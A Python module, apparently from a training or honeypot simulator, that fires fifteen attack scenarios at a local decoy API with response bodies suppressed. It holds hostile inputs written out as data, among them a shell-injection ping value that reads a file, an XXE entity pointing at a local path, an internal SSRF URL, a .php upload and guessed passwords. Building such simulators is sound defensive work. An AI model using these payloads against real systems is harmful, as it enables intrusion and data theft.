import os

import httpx

TARGET_API = os.getenv("BACKEND_URL", "http://localhost:8001") + "/api/v1/target"
TARGET_APP_URL = os.getenv("TARGET_APP_URL", "http://localhost:3000")
BACKEND_URL = os.getenv("BACKEND_URL", "http://localhost:8001")

RESPONSE_BODY_SUPPRESSED = (
    "[response body suppressed: attacker output is limited to seeded synthetic "
    "decoy documents]"
)


def _log(sim_id: str, message: str, detail: str = ""):
    try:
        from runner import append_log  # noqa: WPS433
        append_log(sim_id, message, detail)
    except Exception:
        pass


def _safe_transport_error(exc: Exception) -> str:
    """Return useful transport context without echoing request/response data."""
    return f"Local simulation transport failed ({type(exc).__name__}); no response content retained"


def _response_trace(status_code: int) -> str:
    """Never copy a target response body into the attacker-visible trace."""
    return f"Status: {status_code}\n{RESPONSE_BODY_SUPPRESSED}"


def _post(path: str, sim_id: str = "", redact_response: bool = False, **kwargs) -> dict:
    # ``redact_response`` is retained for callers from older scenario versions;
    # every response is now suppressed unconditionally at this boundary.
    del redact_response
    url = f"{TARGET_API}{path}"
    headers = dict(kwargs.pop("headers", {}))
    if sim_id:
        headers.setdefault("X-Simulation-ID", sim_id)
    try:
        r = httpx.post(url, timeout=10.0, headers=headers, **kwargs)
        _log(sim_id, f"POST {path}", _response_trace(r.status_code))
        return {
            "status": r.status_code,
            "body": RESPONSE_BODY_SUPPRESSED,
            "data_classification": "synthetic_decoy_only",
        }
    except Exception as exc:
        safe_error = _safe_transport_error(exc)
        _log(sim_id, f"POST {path} FAILED", safe_error)
        return {"status": "error", "error": safe_error}


def _get(path: str, sim_id: str = "", **kwargs) -> dict:
    url = f"{TARGET_API}{path}"
    headers = dict(kwargs.pop("headers", {}))
    if sim_id:
        headers.setdefault("X-Simulation-ID", sim_id)
    try:
        r = httpx.get(url, timeout=10.0, headers=headers, **kwargs)
        _log(sim_id, f"GET {path}", _response_trace(r.status_code))
        return {
            "status": r.status_code,
            "body": RESPONSE_BODY_SUPPRESSED,
            "data_classification": "synthetic_decoy_only",
        }
    except Exception as exc:
        safe_error = _safe_transport_error(exc)
        _log(sim_id, f"GET {path} FAILED", safe_error)
        return {"status": "error", "error": safe_error}


def run_broken_auth(target_app_url: str = TARGET_APP_URL, org_id: str = "", sim_id: str = "") -> dict:
    _log(sim_id, "Starting Broken Auth attack", "Credential stuffing against /target/auth/login")
    for password in ["Crestwood2023!", "Welcome123!", "Winter2024!"]:
        _post("/auth/login", sim_id, json={"email": "admin_backup", "password": password})
    return {"scenario": "broken_auth", "status": "sent"}


def run_xss(target_app_url: str = TARGET_APP_URL, org_id: str = "", sim_id: str = "") -> dict:
    _log(
        sim_id,
        "Starting Stored XSS attack",
        "Rendering a pre-seeded inert marker through the controlled simulation beacon",
    )
    # The demo represents the render/exfiltration signal directly. It never
    # authenticates as a real student and never inserts a CourseReview row.
    _get("/telemetry-beacon", sim_id, params={"tok": "HT_XSS_COOKIE_01"})
    return {"scenario": "xss", "status": "sent"}


def run_csrf(target_app_url: str = TARGET_APP_URL, org_id: str = "", sim_id: str = "") -> dict:
    _log(sim_id, "Starting CSRF attack", "Forged profile update without CSRF token")
    _post("/portal/profile/email", sim_id, json={"email": "simulated-recipient@example.invalid"})
    return {"scenario": "csrf", "status": "sent"}


def run_idor(target_app_url: str = TARGET_APP_URL, org_id: str = "", sim_id: str = "") -> dict:
    _log(sim_id, "Starting IDOR attack", "Authenticating as a seeded student, then enumerating into the reserved decoy range")
    auth_response = httpx.post(
        f"{TARGET_API}/auth/login",
        headers={"X-Simulation-ID": sim_id},
        json={"email": "student1@crestwood.edu", "password": "Student2024!"},
        timeout=10.0,
    )
    token = auth_response.json().get("access_token", "") if auth_response.is_success else ""
    headers = {"Authorization": f"Bearer {token}"} if token else {}
    for student_id in ["8998", "8999", "9000"]:
        _get(f"/students/{student_id}", sim_id, headers=headers)
    return {"scenario": "idor", "status": "sent"}


def run_command_injection(target_app_url: str = TARGET_APP_URL, org_id: str = "", sim_id: str = "") -> dict:
    _log(sim_id, "Starting Command Injection", "Ping diagnostic with shell metacharacters")
    _post("/admin/tools/ping", sim_id, json={"host": "127.0.0.1; cat Exam_Answer_Key.pdf"})
    return {"scenario": "command_injection", "status": "sent"}


def run_ssrf(target_app_url: str = TARGET_APP_URL, org_id: str = "", sim_id: str = "") -> dict:
    _log(sim_id, "Starting SSRF attack", "Fetching internal metadata URL")
    _post("/admin/tools/fetch-preview", sim_id, json={"url": "http://internal/finance-api"})
    return {"scenario": "ssrf", "status": "sent"}


def run_file_upload(target_app_url: str = TARGET_APP_URL, org_id: str = "", sim_id: str = "") -> dict:
    _log(sim_id, "Starting File Upload attack", "Uploading inert executable-looking content, then retrieving the discovered decoy file")
    _post(
        "/portal/assignments/upload",
        sim_id,
        headers={"X-File-Name": "training-payload.php", "Content-Type": "text/plain"},
        content=b"inert demonstration payload",
    )
    _get("/portal/assignments/files/Faculty_Salaries.pdf", sim_id)
    return {"scenario": "file_upload", "status": "sent"}


def run_api_abuse(target_app_url: str = TARGET_APP_URL, org_id: str = "", sim_id: str = "") -> dict:
    _log(sim_id, "Starting API Abuse", "Mass-assignment attempt with an unexpected administrator role")
    suffix = (sim_id or "local")[-8:]
    _post(
        "/auth/register",
        sim_id,
        json={
            "email": f"attack-sim-{suffix}@example.com",
            "password": "SimulationOnly-123!",
            "name": "Synthetic Operator",
            "major": "Undeclared",
            "role": "admin",
        },
    )
    _get("/api/data", sim_id, headers={"X-API-Key": "stolen_key"})
    return {"scenario": "api_abuse", "status": "sent"}


def run_session_attack(target_app_url: str = TARGET_APP_URL, org_id: str = "", sim_id: str = "") -> dict:
    _log(sim_id, "Starting Session Attack", "Issuing a decoy session, logging out, then replaying the same bearer token")
    login_response = httpx.post(
        f"{TARGET_API}/auth/login",
        headers={"X-Simulation-ID": sim_id},
        json={"email": "session.demo@crestwood.internal", "password": "SessionDemo2026!"},
        timeout=10.0,
    )
    token = login_response.json().get("access_token", "") if login_response.is_success else ""
    _log(
        sim_id,
        "Captured decoy session",
        f"Status: {login_response.status_code}\nBearer token retained in the isolated simulator",
    )
    headers = {"Authorization": f"Bearer {token}"} if token else {}
    _post("/auth/logout", sim_id, headers=headers)
    _get("/portal/dashboard", sim_id, headers=headers)
    return {"scenario": "session_attack", "status": "sent"}


def run_mitm(target_app_url: str = TARGET_APP_URL, org_id: str = "", sim_id: str = "") -> dict:
    _log(sim_id, "Starting MITM (simulated)", "Suspicious X-Forwarded-For chain")
    _get(
        "/api/secure",
        sim_id,
        headers={
            "X-Forwarded-For": "10.0.0.1, 203.0.113.50",
            "X-Client-Cert-Fingerprint": "mismatched-training-signature",
        },
    )
    return {"scenario": "mitm", "status": "sent"}


def run_dns_redirect(target_app_url: str = TARGET_APP_URL, org_id: str = "", sim_id: str = "") -> dict:
    _log(sim_id, "Starting DNS/Redirect attack", "Open redirect to phishing domain")
    _get("/resources/go", sim_id, params={"url": "https://crestwood-login.training-lookalike.example.invalid"})
    return {"scenario": "dns_redirect", "status": "sent"}


def run_deserialization(target_app_url: str = TARGET_APP_URL, org_id: str = "", sim_id: str = "") -> dict:
    _log(sim_id, "Starting Deserialization attack", "Importing malicious settings blob")
    _post("/admin/settings/import", sim_id, json={"__ht_marker__": "training-only", "mode": "simulated"})
    return {"scenario": "deserialization", "status": "sent"}


def run_xxe(target_app_url: str = TARGET_APP_URL, org_id: str = "", sim_id: str = "") -> dict:
    _log(sim_id, "Starting XXE attack", "XML external entity in transcript import")
    xml = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///internal/honeytoken/transcripts">]><root>&xxe;</root>'
    _post("/admin/students/import", sim_id, content=xml, headers={"Content-Type": "application/xml"})
    return {"scenario": "xxe", "status": "sent"}


def run_cache_poisoning(target_app_url: str = TARGET_APP_URL, org_id: str = "", sim_id: str = "") -> dict:
    _log(sim_id, "Starting Cache Poisoning", "X-Forwarded-Host injection")
    _get("/", sim_id, headers={"X-Forwarded-Host": "training-cache.example.invalid"})
    _get("/", sim_id)
    return {"scenario": "cache_poisoning", "status": "sent"}


def run_supply_chain(target_app_url: str = TARGET_APP_URL, org_id: str = "", sim_id: str = "") -> dict:
    _log(sim_id, "Starting Supply Chain attack", "Malicious package version pull")
    _get("/fake-registry/crestwood-internal-utils", sim_id)
    return {"scenario": "supply_chain", "status": "sent"}


SCENARIOS = {
    "broken_auth": run_broken_auth,
    "xss": run_xss,
    "csrf": run_csrf,
    "idor": run_idor,
    "command_injection": run_command_injection,
    "ssrf": run_ssrf,
    "file_upload": run_file_upload,
    "api_abuse": run_api_abuse,
    "session_attack": run_session_attack,
    "mitm": run_mitm,
    "dns_redirect": run_dns_redirect,
    "deserialization": run_deserialization,
    "xxe": run_xxe,
    "cache_poisoning": run_cache_poisoning,
    "supply_chain": run_supply_chain,
}
